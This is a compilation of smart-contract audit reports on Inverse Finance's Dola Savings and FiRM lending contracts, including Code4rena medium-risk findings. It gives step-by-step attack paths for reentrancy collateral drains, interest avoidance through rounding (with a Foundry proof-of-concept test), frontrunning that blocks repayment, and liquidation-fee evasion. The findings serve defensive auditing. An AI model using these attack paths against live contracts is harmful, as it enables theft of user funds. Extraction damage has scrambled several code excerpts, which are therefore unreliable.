 with the folowing code:-        uint dolaReserve = getDolaReserve() + exactDolaIn;-        uint dbrReserve = getDbrReserve() - exactDbrOut;
 +        uint balance = dbr.balanceOf(address(this));
 +        uint dolaReserve = getK() / balance + exactDolaIn;
 +        uint dbrReserve = dbr.balanceOf(address(this)) - exactDbrOut;
 To save even more gas, with these changes, you could cache 
Developer Response
 getK() instead of caling it twice.
 Addressed in h ps://github.com/InverseFinance/dola
savings/pul/3/commits/7c7683c7bdc6e5b6533b5f002cb853a2fa0d79ba.
 2. Gas - Cache storage variables in reward calculation logic
 Several storage variables are read multiple times in the implementation of the 
modifier and the 
claimable() function.
 Technical Details
 The folowing variables are fetched from storage multiple times:
 yearlyRewardBudget
 totalSupply
 rewardIndexMantissa
 updateIndex
I mpact
 Gas savings.
 Recommendation
 Consider using a local variable as a cache to prevent multiple reads from storage.
 Developer Response
 Addressed in h ps://github.com/InverseFinance/dola
savings/pul/3/commits/b77a420808fb92031010fc5122c4b1b63f37b729
 3. Gas - In 
getDolaReserve() add an option to pass 
getDolaReserve() and 
getDbrReserve()
 getDbrReserve() are o en caled within the same scope, with
 getDolaReserve() making a cal to 
getDbrReserve(), it’s possible to save gas by passing the
 getDbrReserve() result to 
getDolaReserve().
 Technical Details
 29 |    function getDbrOut(uint dolaIn) public view returns (uint dbrOut) {
 30 |        
require(dolaIn > 0, "dolaIn must be positive");
 31 |        
uint dolaReserve = sDola.getDolaReserve();
 32 |        
uint dbrReserve = sDola.getDbrReserve();
 Here we can see 
getDolaReserve() and 
File: sDola.sol
 68 |    function getDolaReserve() public view returns (uint) {
 69 |        
70 |   }
 return getK() / getDbrReserve();
 71 |
 73 |        
getDbrReserve() are used in the same scope.
 72 |    function getDbrReserve() public view returns (uint) {
 return dbr.balanceOf(address(this)) + savings.claimable(address(this));
 74 |   }
 The 
getDbrReserve() result can be passed to 
balanceOf() and 
claimable() methods.
 getDolaReserve() to prevent additional cals to
 sDola.sol#L73-L79
sDolaHelper.sol#L29-L36
 I mpact
 Gas savings.
 Recommendation
 function getDolaReserve() public view returns (uint) {
 return getK() / getDbrReserve();
 }
 +       return getK() / dbrReserve;
 +   }
 +   function getDolaReserve(dbrReserve) public view returns (uint) {
 With that added it’s possible to update the helper contract functions getDbrOut() and
 getDolaIn().
 Developer Response
 Addressed in h ps://github.com/InverseFinance/dola
savings/pul/3/commits/1f01bb0cc94e359830b5e44b7c299280ec0d4bf5.
 4. Gas - Week elapsed time calculation can be simplified
 The elapsed seconds in the current week can be calculated using the modulo operator.
 Technical Details
 In 
totalAssets(), the 
I mpact
 Gas savings.
 Recommendation
 timeElapsed variable can be simplified as -   uint timeElapsed = block.timestamp - (week * 7 days);
 block.timestamp % 7 days.
 +   uint timeElapsed = block.timestamp % 7 days;
Developer Response
 Addressed in h ps://github.com/InverseFinance/dola
savings/pul/3/commits/45c4d9 98df5c97952d72af87ab842aaa37c01e.
 Informational Findings
 1. Informational - Missing limits when se ing max amounts
 There is one missing limit in 
setMaxRewardPerDolaMantissa(), and this could lead to unexpected
 scenarios.
 Technical Details
 81 | function setMaxRewardPerDolaMantissa(uint _max) public onlyGov 
updateIndex(msg.sender) {
 82 |         
83 |     
}
 maxRewardPerDolaMantissa = _max;
 DolaSavings.sol#L81
 I mpact
 Informational.
 Recommendation
 Consider adding a max limit check.
 Developer Response
 Addressed in h ps://github.com/InverseFinance/dola
savings/pul/7/commits/707358b957cf142e896140beb59878f4e999bdc7.
 2. Informational - Missing event for a critical parameter change
 It is recommended to emit events when updating state variables.
 Technical Details
 The folowing functions are missing event emission:
 DolaSavings.sol#70 DolaSavings.sol#71 DolaSavings.sol#73 DolaSavings.sol#81
 DolaSavings.sol#85 Dola.sol#L81 Dola.sol#L81100
I mpact
 Informational.
 Recommendation
 Add events to log the state variable changes.
 Developer Response
 Partia ly addressed in h ps://github.com/InverseFinance/dola
savings/pul/7/commits/46afe0b1350346fc8001bb43da441de1cfb5d70c.
 3. Informational - 
declared 
public functions not called by the contract should be
 external instead
 Using external visibility is recommended for clarity.
Technical Details
 70 | function setOperator(address _operator) public onlyGov { operator = _operator; }
 71 | function setGov(address _gov) public onlyGov { gov = _gov; }
 73 | function setMaxYearlyRewardBudget(uint _max) public onlyGov updateIndex(msg.sender) 
{
 81 | function setMaxRewardPerDolaMantissa(uint _max) public onlyGov 
updateIndex(msg.sender) {
 85 | function setYearlyRewardBudget(uint _yearlyRewardBudget) public onlyOperator 
updateIndex(msg.sender) {
 90 | function stake(uint amount, address recipient) public updateIndex(recipient) {
 96 | function unstake(uint amount) public updateIndex(msg.sender) {
 102 | function claimable(address user) public view returns(uint) {
 114 | function claim(address to) public updateIndex(msg.sender) {
 119 | function sweep(address token, uint amount, address to) public onlyGov {
 DolaSavings.sol#L70 DolaSavings.sol#L71 DolaSavings.sol#L73 DolaSavings.sol#L81
 DolaSavings.sol#L85 DolaSavings.sol#L90 DolaSavings.sol#L96 DolaSavings.sol#L102
 DolaSavings.sol#L114 DolaSavings.sol#L119
I mpact
 Informational.
 Recommendation
 Change the function visibility.
 Developer Response
 Addressed in h ps://github.com/InverseFinance/dola
savings/pul/7/commits/ade8b1d034e9b354dbb647d8d5bc54e1c60728c7.
 4. Informational - 
else block unnecessary
 By eliminating the 
else block and directly returning the values from the 
nesting can be removed:
 Technical Details
 64 |        
65 |             
66 |         
67 |             
68 |             
if(timeElapsed > duration) {
 return targetK;
 } else {
 uint targetWeight = timeElapsed;
 if-block, one level of
 69 |             
70 |         
uint prevWeight = duration - timeElapsed;
 return (prevK * prevWeight + targetK * targetWeight) / duration;
 }
 sDola.sol#L64
I mpact
 Informational.
 Recommendation
 Code can be replaced by:
 64 |        
65 |             
66 |         
67 |        
if(timeElapsed > duration) {
 return targetK;
 }
 uint targetWeight = timeElapsed;
 68 |        
69 |        
uint prevWeight = duration - timeElapsed;
 return (prevK * prevWeight + targetK * targetWeight) / duration;
 Developer Response
 Addressed in h ps://github.com/InverseFinance/dola
savings/pul/7/commits/85938f54759d950a4f4db045ce3b143 a971185.
 Final remarks
 The yAudit of Inverse Finance’s Dola Savings platform, conducted by adriro and pandadefi,
 provided a thorough examination of its smart contracts. The audit, spanning three days,
 uncovered a range of findings from high to low impact, alongside gas-saving and informational
 insights. Critical vulnerabilities, such as the susceptibility of the sDola vault to inflation a acks
 and the potential manipulation of sDola in lending-borrowing markets, were promptly
 addressed. Lower-impact issues, focusing on aspects like checks and function optimizations,
 were also noted for improvement. The audit emphasizes the platform’s strong foundation in
 smart contract development and its commitment to security, e ciency, and continuous
 improvement.


 Inverse Finance FiRM Audit
 We reviewed the https://github.com/InverseFinance/FiRM repository at commit c1274c8.
 The review started on Monday, April 17, 2023.
 This report was updated on Thursday, May 11, 2023.
 Introduction
 We have conducted an audit of the FiRM protocol, developed by Inverse Finance, with
 the objective of providing an independent assessment of the project's smart contracts'
 security, code quality, and overall functionality. The FiRM protocol is a decentralized
 finance (DeFi) protocol that enables users to access fixed-rate loans, using a variety of
 assets as collateral.
 The protocol is built around the concept of Markets, which allow users to deposit
 collateral and borrow DOLA, a stablecoin pegged to the US dollar. Each Market supports
 a specific type of collateral, with asset prices primarily sourced from Chainlink price
 feeds. For every Market, the protocol creates a unique escrow contract for each user,
 enabling them to participate in on-chain governance and other protocol interactions
 even when their tokens are deposited as collateral in FiRM.
 Overall, the codebase is well-documented and easy to comprehend. However, there are
 several instances where additional safety measures could be implemented to enhance
 the code's resilience. Many best practices are not employed, such as adhering to the
 checks-effects-interactions pattern, using reentrancy guards, or utilizing "safe" token
 function calls. As a result, a significant amount of responsibility is delegated to the
 governance process, relying on the governance review of proposals to prevent the
 addition of new markets and escrows that could introduce avoidable vulnerabilities.
It's important to mention that a significant portion of this code has previously undergone
 a Code4rena audit contest, resulting in a few overlapping findings. We have only
 included select overlapping findings in our report after reviewing the team's responses
 during the contest and determining that certain issues still warrant attention and
 resolution.
 The main recommendations provided in this report aim to enhance the protocol's
 security by preventing issues that arise from unexpected reentrancies and adopting a
 more secure approach when handling external protocol integrations.
 Findings
 1. 
ConvexCurveEscrow
 enables a potential reentrancy
 IMPACT
 IMPACT HIGH
 HIGH
 LIKELIHOOD
 LIKELIHOOD MEDIUM
 MEDIUM
 The 
ConvexCurveEscrow.pay
 function calls 
CvxCrvStakingWrapper.withdraw 
, which
 leaves the system open to a reentrancy that allows a user to fully withdraw their
 collateral even if they have an open debt position. This happens due to the external calls
 performed by the staking wrapper:
 . Attacker deposits some collateral.
 . Attacker borrows some DOLA.
 . Attacker calls the 
Market.withdraw
 function to withdraw part of her collateral.
 . The 
Market
 will use the 
ConvexCurveEscrow.balance
 function to compute the
 withdrawal limit, and then call the 
ConvexCurveEscrow.pay
 function to transfer
 tokens to the user.
 . The 
ConvexCurveEscrow
 contract will then call the
 CvxCrvStakingWrapper.getReward
 function.
 . The 
CvxCrvStakingWrapper
 contract will call: a. The 
getReward
 function of the
 CvxCrvStaking
 contract, which will in turn call the 
getReward
 function of all the
 extraRewards
 contracts. b. The 
onRewardClaim
 function of the 
rewardHook
 (if
 defined)
 . If any of these calls reach an attacker controlled contract, the attacker can reenter
 the 
Market.withdraw
 function, which will use the same withdrawal limit as step 4,
 as the escrow's balance has not been updated yet.
Even though we didn't find a direct way to exploit this issue with Convex's current
 configuration, this could change if a new reward contract is added or a reward hook is
 enabled. We consider this issue to be of medium likelihood as the Inverse Finance team
 has no control over the reward contracts or the reward hook in Convex's staking
 wrapper.
 Note: Related to the issue "ERC777 reentrancy when withdrawing can be used to
 withdraw all collateral" reported by Code4rena.
 Recommendation
 Consider using reentrancy guards for all Market functions that perform external calls.
 Alternatively, for the specific case of 
ConvexCurveEscrow
 it is possible to use
 reentrancy guards for all functions that perform external calls such as 
pay
 and
 onDeposit 
.
 Update: As of commit 
2ff3c03 
, this issue has been resolved by locally storing and
 updating the staked balance before any calls that could result in a reentrancy.
 2. 
Market.withdraw
 reentrancy can be used to withdraw more
 collateral than allowed
 IMPACT
 IMPACT HIGH
 HIGH
 LIKELIHOOD
 LIKELIHOOD LOW
 LOW
 The 
Market.withdraw
 function is susceptible to potential reentrancy through external
 calls that might be present in the escrow's pay function. This vulnerability could be
 exploited to withdraw a user's entire collateral, even if they have an open borrow
 position, by executing a second withdrawal before the amount used to calculate the
 withdrawal limit is updated. This issue is a generalized version of the
 "ConvexCurveEscrow enables a potential reentrancy" finding mentioned earlier.
 Note: This issue is related to the "ERC777 reentrancy when withdrawing can be used to
 withdraw all collateral" reported by Code4rena. We chose to include this overlapping
 issue in our report because we believe its scope is broader than previously identified: it
 not only involves token standards with callbacks but also any token or escrow integration
 that execute external calls or have upgradeable components. Additionally, we disagree
 with the team's comment justifying this behavior due to only accepting ERC20 compliant
 tokens, as the ERC20 specification does not prohibit tokens from performing external
 calls or having upgradeable components.
 Recommendation
Consider using reentrancy guards in all functions that perform external calls to contracts
 that are not controlled by Inverse Finance.
 3. Potential reentrancy in 
INVEscrow
 IMPACT
 IMPACT HIGH
 HIGH
 LIKELIHOOD
 LIKELIHOOD LOW
 LOW
 A reentrancy issue, similar to the one enabled by 
ConvexCurveEscrow
 but much less
 likely, is present in the 
INVEscrow
 contract.
 Before transferring the escrow tokens in the 
INVEscrow.pay
 function, the
 xINV.redeemUnderlying
 function is called. This external call eventually reaches the
 xINV 
's 
comptroller
 contract, which has upgradeable components. In theory, some
 external call to an attacker controlled contract could be unintentionally introduced in the
 future, leading to vulnerabilities such as reentering the 
Market.withdraw
 function to
 withdraw more collateral.
 Recommendation
 Consider using reentrancy guards for all 
Market
 functions that perform external calls.
 Alternatively, for the specific case of 
INVEscrow
 it is possible to use reentrancy guards
 for all functions that perform external calls.
 Update: As of commit 
ddefe1d 
, this issue has been resolved by by locally storing and
 updating the staked balance before any calls that could result in a reentrancy.
 4. Stale chainlink answers are accepted
 IMPACT
 IMPACT HIGH
 HIGH
 LIKELIHOOD
 LIKELIHOOD LOW
 LOW
 The 
Oracle.getFeedPrice
 function only checks that the returned price is greater than
 zero. However, there are no checks to prevent using stale prices, which could happen
 due to issues with Chainlink, or if the price reaches the minimum price configured for
 that specific feed.
 This was also reported by Code4rena and marked as fixed, but only the greater than zero
 check was implemented.
 Recommendation
 Consider always checking if the price returned by the Chainlink feed is recent enough.
Update: As of commit 
e28dae4 
, this issue has been resolved by introducing a check in
 the 
BorrowController
 which disables borrowing if the feed has't updated the price
 within the configured threshold.
 5. 
onlyINVEscrow
 restrictions are too loose
 IMPACT
 IMPACT MEDIUM
 MEDIUM
 LIKELIHOOD
 LIKELIHOOD LOW
 LOW
 The 
DbrDistributor.onlyINVEscrow
 modifier is intended to grant access exclusively to
 escrows of specific markets, such as the 
INVEscrow 
. In order to achieve this, it checks
 if the 
msg.sender
 is a valid escrow by verifying that the associated market is registered
 in the 
DBR
 contract.
 However, the current implementation fails to effectively limit access to specific markets,
 and could result in escrows from unintended markets calling these functions. The impact
 of this will completely depend on the escrow's implementation.
 Recommendation
 Consider keeping a local registry of the allowed markets in the 
DbrDistributor
 contract, managed by its 
operator 
. This will prevent unintended calls from escrows of
 other markets.
 Update: As of commit 
ac71fff 
, this issue has been resolved by hardcoding the 
INV
 address and checking that it is equal to the market's collateral address.
 6. 
BorrowController.onRepay
 is not called on liquidation
 IMPACT
 IMPACT LOW
 LOW
 LIKELIHOOD
 LIKELIHOOD LOW
 LOW
 The 
Market.repay
 function calls the 
DBR.repay
 function and
 BorrowController.repay
 (if defined). On the other hand, the 
Market.liquidate
 function only calls 
DBR.repay 
. This could lead to reaching the the 
BorrowController 
's
 daily limit even when loans have been repaid through liquidation.
 Someone could also attempt to abuse this and DOS the borrowing functionality:
 . Monitor and wait for a transaction that increases the price of the collateral from the
 perspective of the oracle being used by the market.
 . Before said transaction, deposit and borrow as much DOLA as possible, ideally close
 to the daily borrow limit.
 . After the transaction, liquidate the position.
Note: this behavior is unlikely in practice because it would not be free for the attacker
 and the amount of collateral needed for the deposit might be huge depending on the
 daily borrow limit.
 Recommendation
 Consider calling 
BorrowController.repay
 from 
Market.liquidate
 the same way in
 which it is called in the 
repay
 function.
 Update: As of commit 
5f1f75a 
, this issue has been resolved by calling 
onRepay
 in the
 liquidate
 function.
 7. Typos
 ENHANCEMENT
 ENHANCEMENT
 The codebase contains several typos. A few examples:
 raio
 on 
ConvexCurvePriceFeed 
.
 addres
 on 
BorrowController 
here and here.
 Fed contact
 on 
Fed 
.
 8. Remove TODO comment
 ENHANCEMENT
 ENHANCEMENT
 Remove the TODO comment in 
INVEscrow 
.
 9. Naming issues
 ENHANCEMENT
 ENHANCEMENT
 Rename 
onlyINVEscrow
 to 
onlyEscrow 
, as it allows any sender as long as it is an
 escrow from a valid market.
 Rename 
threeCurveTokenBps
 to 
weight 
, since that's the nomenclature used on the
 convex smart contract.
 10. Missing error messages
 ENHANCEMENT
 ENHANCEMENT
 Some of the 
require
 statements in following functions don't contain an error message:
DbrDistributor.setRewardRateConstraints
 DbrDistributor.setRewardRate
 Fed.expansion
 GOhmTokenEscrow.delegate
 GovTokenEscrow.delegate
 INVEscrow.delegate
 Consider including error strings in all 
require
 statements to improve the UX when
 interacting with these functions.
 11. Missing events
 ENHANCEMENT
 ENHANCEMENT
 The functions in the 
DbrDistributor
 contract don't emit events, which might make it
 difficult for off-chain services to monitor the contract.
 The 
Fed.takeProfit
 function is missing an event that could be useful to, for example,
 show the profits on a dune dashboard.
 Most of the contracts are missing events for important administrative functions that
 could be useful to increase awareness of critical changes.
 12. Multiple storage reads
 OPTIMIZATION
 OPTIMIZATION
 There are a few places in the codebase where a storage variable or mapping entry is
 read multiple times. For example:
 The 
Oracle.getNormalizedPrice
 function reads 
feeds[token]
 multiple times.
 The 
Market.getEscrow
 function reads 
escrows[user]
 multiple times.
 The 
Market.borrowInternal
 function reads 
borrowController
 multiple times.
 The 
Market.repay
 function reads 
borrowController
 multiple times.
 The 
Market.forceReplenish
 function reads 
dbr
 multiple times.
 Recommendation
 Consider storing these variable in memory to reduce the number of storage reads.
 13. Variable is always 0
OPTIMIZATION
 OPTIMIZATION
 When calculating the 
unsafeLiquidationIncentive
 in the 
Market 
's constructor, the
 liquidationFeeBps
 storage variable is used. However, this variable is not initialized
 previously so its value is 0.
 Recommendation
 Consider removing 
liquidationFeeBps
 from the calculation of
 unsafeLiquidationIncentive
 in the 
Market 
's constructor.


Medium Risk Findings (18)
[M-01] Unhandled return values of transfer and transferFrom
Submitted by 2997ms

ERC20 implementations are not always consistent. Some implementations of transfer and transferFrom could return ‘false’ on failure instead of reverting. It is safer to wrap such calls into require() statements to these failures.

Proof of Concept
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L205
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L280
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L399
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L537
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L570
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L602

Recommended Mitigation Steps
Check the return value and revert on 0/false or use OpenZeppelin’s SafeERC20 wrapper functions.

08xmt (Inverse) acknowledged and commented:

Every deployment of a market will use a trusted token, and be audited by the DAO and governance. Even when using safe transfer, there’s no guarantee that an ERC20 token will behave as expected.

[M-02] Users can avoid paying fees if they manage to update their accrued fees periodically
Submitted by RaoulSchaffranek, also found by carlitox477

DBR.sol#L287

While a user borrows DOLA, his debt position in the DBR contract accrues more debt over time. However, Solidity contracts cannot update their storage automatically over time; state updates must always be triggered by externally owned accounts. For this reason, the DBR contract cannot accurately represent a user’s debt position in its storage at all times. Instead, the contract offers a method accrueDueTokens that, when called, updates the internal storage with the debts that accrued since the last update. This method is called before all critical financial operations that depend on an accurate value of the accumulated deficit in the contract’s storage. On top, this method can also be invoked permissionless at any time. Suppose a borrower manages to call this function periodically and keep the time difference between updates short. In that case, a rounding error in the computation of the accrued debt can cause the expression to round down to zero. In this case, the user successfully avoided paying interest on his debt.

Proof of Concept
For reference, here is the affected code:

    function accrueDueTokens(address user) public {

        uint debt = debts[user];

        if(lastUpdated[user] == block.timestamp) return;

        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

        dueTokensAccrued[user] += accrued;

        totalDueTokensAccrued += accrued;

        lastUpdated[user] = block.timestamp;

        emit Transfer(user, address(0), accrued);

    }
The problem is that the function updates the lastUpdated[user] storage variable even when accrued is 0.

Example
Let’s assume that the last update occurred at t_0.
Further assume that the next update occurs at t_1 with t_1 - t_0 = 12s. (12s is the current Ethereum block time)
Suppose that the user’s recorded debt position at t_0 is 1,000,000 wei.
Then the accrued debt formula gives us the following:

accrued = (t_1 - t_0) * debt / 365 days

        = 12          * 1,000,000 / 31,536,000

        = 1,000,000 / 31,536,000

        = 0 (because unsigned integer division rounds down)
Maximizing profit
The accrued debt formula rounds towards zero if we have (t_1 - t_0) * debt < 365 days.
This gives us a method to compute the maximal debt that we can deposit to make the attack more efficient:

debt_max = 365 days / 12s -1 = 2,627,999
Notice that an attacker is not limited to these small loans. He can split a massive loan into multiple small loans, capped at 2,627,999.
To borrow X tokens (where X is given in WEI), we can compute the number of needed loans as:

#loans = X / 2,627,999
For example, to borrow 1 DOLA:

#loans = 10^18 / 2,627,999 = 380517648599
To borrow 1,000,000 DOLA we would thus need 380,517,648,599,000,000 small loans.

Economical feasibility
The attack would be economically feasible if the costs of the attack were lower than the interest that accrued throughout the successful attack.
The dominating factor of the attack costs is the gas costs which the attacker needs to pay to update the accrued interest of the small loans every second. A clever attacker would batch as many updates into a single transaction as possible to minimize the gas overhead of the transaction. Still, at the current block time (12s), gas price (7 gwei), block gas limit (30,000,000), and current ETH price ($1,550.80), it’s hardly imaginable that this attack is economically feasible at the moment.

Risk parameters
However, all these values could change in the future. And if we look at other networks, Layer2 or EVM compatible Layer1, the parameters might be different today.

Also, notice that if the contract were used to borrow a different asset than DOLA, the numbers would look drastically different. The risk increases with the asset’s price and becomes bigger the fewer decimals the token uses. For example, to borrow 1 WBTC (8 decimals), we would only need 39 small loans:

#loans = 10^8 / 2,627,999 ~39
And to borrow WBTC worth $1,000,000 at a price of 20,746$/BTC, we would need 1864 small loans.

#loans ~= 49*10^8 / 2,627,999 ~= 1864
Foundry
The following test demonstrates how to avoid paying interest on a loan for 1h. A failing test means that the attack was successful.

$ git diff src/test/DBR.t.sol

diff --git a/src/test/DBR.t.sol b/src/test/DBR.t.sol

index 3988cf7..8779da7 100644

--- a/src/test/DBR.t.sol

+++ b/src/test/DBR.t.sol

@@ -25,6 +25,20 @@ contract DBRTest is FiRMTest {

         vm.stopPrank();

     }

 

+    function testFail_free_borrow() public {

+        uint borrowAmount =  2_627_999;

+

+        vm.prank(address(market));

+        dbr.onBorrow(user, borrowAmount);

+

+        for (uint i = 12; i <= 3600; i += 12) {

+            vm.warp(block.timestamp + 12);

+            dbr.accrueDueTokens(user);

+        }

+        assertEq(dbr.deficitOf(user), 0);

+    }

+

+

     function testOnBorrow_Reverts_When_AccrueDueTokensBringsUserDbrBelow0() public {

         gibWeth(user, wethTestAmount);

         gibDBR(user, wethTestAmount);
Output:

$ forge test --match-test testFail_free_borrow -vv

[⠆] Compiling...

[⠊] Compiling 1 files with 0.8.17

[⠢] Solc 0.8.17 finished in 2.62s

Compiler run successful


Running 1 test for src/test/DBR.t.sol:DBRTest

[FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543)

Test result: FAILED. 0 passed; 1 failed; finished in 8.03ms


Failing tests:

Encountered 1 failing test in src/test/DBR.t.sol:DBRTest

[FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543)


Encountered a total of 1 failing tests, 0 tests succeeded
Classified as a high medium because the yields can get stolen/denied. It’s not high risk because I don’t see an economically feasible exploit.

Tools Used
VSCode, Wolramapha, Foundry

Recommended Mitigation Steps
Document the risks transparently and prominently.
Re-evaluate the risks according to the specific network parameters of every network you want to deploy to.
Do not update the lastUpdated timestamp of the user if the computed accrued amount was zero.
0xean (judge) commented:

Debatable if this even qualifies as Medium. Leaning towards QA / LOW but will leave open for sponsor review.

08xmt (Inverse) confirmed and commented:

Fixed in https://github.com/InverseFinance/FrontierV2/pull/20.

[M-03] User can borrow DOLA indefinitely without settling DBR deficit by keeping their debt close to the allowed maximum
Submitted by Holmgren

A user can borrow DOLA interest-free. This requires the user to precisely manage their collateral. This issue might become especially troublesome if a Market is opened with some stablecoin as the collateral (because price fluctuations would become negligible and carefully managing collateral level would be easy).

This issue is harder to exploit (but not impossible) if gov takes responsibility for forcing replenishment, since gov has a stronger economic incentive than third parties.

Proof of Concept
If my calculations are correct, with the current gas prices it costs about $5 to call Market.forceReplenish(...). Thus there is no economic incentive to do so as long as a debtor’s DBR deficit is worth less than $5/replenishmentIncentive so probably around $100.

This is because replenishing cannot push a user’s debt under the water (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L567) and a user can repay their debt without having settled the DBR deficit (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531).

So, assuming the current prices, a user can:

Deposit some collateral
Borrow close to the maximum allowed amount of DOLA
Keep withdrawing or depositing collateral so that the collateral surplus does not exceed $100 (assuming current gas prices)
repay() their debt at any time in the future.
Withdraw all the collateral.
All this is possible with arbitrarily large DBR deficit because due to small collateral surplus at no point was it economical for a third party to forceReplenish() the user. If gov takes responsibility for forceReplenish()ing, the above procedure is still viable although the user has to maintain the collateral surplus at no more than around $5.

Recommended Mitigation Steps
Allow replenishing to push the debt under the water and disallow repaying the debt with an outstanding DBR deficit. E.g.:

diff --git a/src/Market.sol b/src/Market.sol

index 9585b85..d69b599 100644

--- a/src/Market.sol

+++ b/src/Market.sol

@@ -531,6 +531,7 @@ contract Market {

     function repay(address user, uint amount) public {

         uint debt = debts[user];

         require(debt >= amount, "Insufficient debt");

+        require(dbr.deficitOf(user) == 0, "DBR Deficit");

         debts[user] -= amount;

         totalDebt -= amount;

         dbr.onRepay(user, amount);

@@ -563,8 +564,6 @@ contract Market {

         uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;

         uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;

         debts[user] += replenishmentCost;

-        uint collateralValue = getCollateralValueInternal(user);

-        require(collateralValue >= debts[user], "Exceeded collateral value");

         totalDebt += replenishmentCost;

         dbr.onForceReplenish(user, amount);

         dola.transfer(msg.sender, replenisherReward);
0xean (judge) commented:

This seems like a dust attack. Will leave open for sponsor review.

08xmt (Inverse) confirmed and commented:

Fixed in https://github.com/InverseFinance/FrontierV2/pull/24.

[M-04] ERC777 reentrancy when withdrawing can be used to withdraw all collateral
Submitted by Lambda

Market.sol#L464

Markets can be deployed with arbitrary tokens for the collateral, including ERC777 tokens (that are downwards-compatible with ERC20). However, when the system is used with those tokens, an attacker can drain his escrow contract completely while still having a loan. This happens because with ERC777 tokens, there is a tokensToSend hook that is executed before the actual transfer (and the balance updates) happen. Therefore, escrow.balance() (which retrieves the token balance) will still report the old balance when an attacker reenters from this hook.

Proof Of Concept
We assume that collateral is an ERC777 token and that the collateralFactorBps is 5,000 (50%). The user has deposited 10,000 USD (worth of collateral) and taken out a loan worth 2,500 USD. He is therefore allowed to withdraw 5,000 USD (worth of collateral). However, he can usse the ERC777 reentrancy to take out all 10,000 USD (worth of collateral) and still keep the loaned 2,500 USD:

The user calls withdraw(amount) to withdraw his 5,000 USD (worth of collateral).
In withdrawInternal, the limit check succeeds (the user is allowed to withdraw 5,000 USD) and escrow.pay(to, amount) is called. This will initiate a transfer to the provided address (no matter which escrow is used, but we assume SimpleERC20Escrow for this example).
Because the collateral is an ERC777 token, the tokensToSend hook is executed before the actual transfer (and before any balance updates are made). The user can exploit this by calling withdraw(amount) again within the hook.
withdrawInternal will call getWithdrawalLimitInternal, which calls escrow.balance(). This receives the collateral balance of the escrow, which is not yet updated. Because of that, the balance is still 10,000 USD (worth of collateral) and the calculated withdraw limit is therefore still 5,000 USD.
Both transfers (the reentered one and the original one) succeed and the user has received all of his collateral (10,000 USD), while still having the 2,500 USD loan.
Recommended Mitigation Steps
Mark these functions as nonReentrant.

0xean (judge) commented:

Sponsor should review as the attack does seem valid with some pre-conditions (ERC777 tokens being used for collateral). Probably more of a Medium severity.

08xmt (Inverse) acknowledged, but disagreed with severity and commented:

We make the security assumption that future collateral added by Inverse Finance DAO is compliant with standard ERC-20 behavior. Inverse Finance is full control of collateral that will be added to the platform and only intend to add collateral that properly reverts on failed transfers. Each ERC20 token added as collateral will be audited for non-standard behaviour. I would consider this a Low Risk finding, depending on how you value errors made in launch parameters.

0xean (judge) decreased severity to Medium and commented:

@08xmt - The revert on a failed transfer here isn’t the issue, it is the re-entrancy that isn’t guarded against properly. While I understand your comment, if it were my codebase, I would simply add the modifier and incur the small gas costs as an additional layer of security to avoid mistakes in the future. I don’t think this qualifies as High, but does show an attack path that could be achieved with an ERC777 token being used as collateral. Going to downgrade to Medium and will be happy to hear more discussion on the topic before final review.

08xmt (Inverse) commented:

@0xean - The risk is still only present with unvetted contracts, and if the desire should exist in the future to implement a market with a token with re-entrancy, the code can be modified as necessary.

Will respect the judge’s decision on severity in the end, but ultimately seem like a deployment parameter risk more than anything.

0xean (judge) commented:

Thanks @08xmt for the response.

While I agree that proper vetting could avoid this issue, the wardens are analyzing the code and documentation that is presented before them and I think in light of this, the issue is valid. Had the warden simply stated that there was a reentrancy modifier missing without showing a valid path to it being exploited, I would downgrade to QA. But given they showed a valid attack path due to the lack of reentrancy controls I think this should be awarded.

[M-05] repay function can be DOSed
Submitted by djxploit, also found by immeas

Market.sol#L531

In repay() users can repay their debt.

function repay(address user, uint amount) public {

        uint debt = debts[user];

        require(debt >= amount, "Insufficient debt");

        debts[user] -= amount;

        totalDebt -= amount;

        dbr.onRepay(user, amount);

        dola.transferFrom(msg.sender, address(this), amount);

        emit Repay(user, msg.sender, amount);

    }
There is a require condition, that checks if the amount provided, is greater than the debt of the user. If it is, then the function reverts. This is where the vulnerability arises.

repay function can be frontrun by an attacker. Say an attacker pay a small amount of debt for the victim user, by frontrunning his repay transaction. Now when the victim’s transaction gets executed, the require condition will fail, as the amount of debt is less than the amount of DOLA provided. Hence the attacker can repeat the process to DOS the victim from calling the repay function.

Proof of Concept
Victim calls repay() function to pay his debt of 500 DOLA , by providing the amount as 500
Now attacker saw this transaction on mempool
Attacker frontruns the transaction, by calling repay() with amount provided as 1 DOLA
Attacker’s transaction get’s executed first due to frontrunning, which reduces the debt of the victim user to 499 DOLA
Now when the victim’s transaction get’s executed, the debt of victim has reduced to 499 DOLA, and the amount to repay provided was 500 DOLA. Now as debt is less than the amount provided, so the require function will fail, and the victim’s transaction will revert.
This will prevent the victim from calling repay function.

Hence an attacker can DOS the repay function for the victim user.

Recommended Mitigation Steps
Implement DOS protection.

0xean (judge) commented:

This seems like a stretch to me. Will leave open for sponsor review but most likely close as invalid.

08xmt (Inverse) confirmed and commented:

Mitigating PR: https://github.com/InverseFinance/FrontierV2/pull/13.

[M-06] User can free from liquidation fee if its escrow balance is less than the calculated liquidation fee
Submitted by jayphbee, also found by catchup, corerouter, trustindistrust, and cccz

User can free from liquidation fee if its escrow balance less than the calculated liquidation fee.

Proof of Concept
If the liquidationFeeBps is enabled, the gov should receive the liquidation fee. But if user’s escrow balance is less than the calculated liquidation fee, gov got nothing.
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L605-L610

        if(liquidationFeeBps > 0) {

            uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;

            if(escrow.balance() >= liquidationFee) {

                escrow.pay(gov, liquidationFee);

            }

        }
Recommended Mitigation Steps
